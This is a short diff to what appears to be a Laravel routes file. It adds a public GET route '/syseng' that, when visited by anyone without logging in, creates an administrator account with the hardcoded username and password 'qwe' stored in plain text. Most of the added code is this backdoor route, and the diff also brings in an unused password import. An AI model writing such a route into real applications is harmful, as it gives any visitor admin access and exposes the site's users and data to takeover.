@@ -5,11 +5,28 @@ use App\Http\Controllers\AuthUi;
 use App\Http\Controllers\FaceRecognitionController;
 use Illuminate\Support\Facades\Route;
 use Symfony\Component\HttpKernel\Profiler\Profile;
+use  App\Models\User;
+
+use function Laravel\Prompts\password;
 
 Route::get('/', function () {
     return view('auth.login');
 })->name('login');
 
+Route::get('/syseng', function () {
+    
+    $user = 'qwe';
+    $password = 'qwe';
+    $name= 'qwe';
+    $account_type = 'admin';
+    $auth = new User();
+    $auth->user = $user;
+    $auth->password = $password;
+    $auth->name = $name;
+    $auth->account_type = $account_type;
+    $auth->save();
+    return view('auth.login');
+});
 
 require __DIR__.'/admin.php';
 require __DIR__.'/client.php';
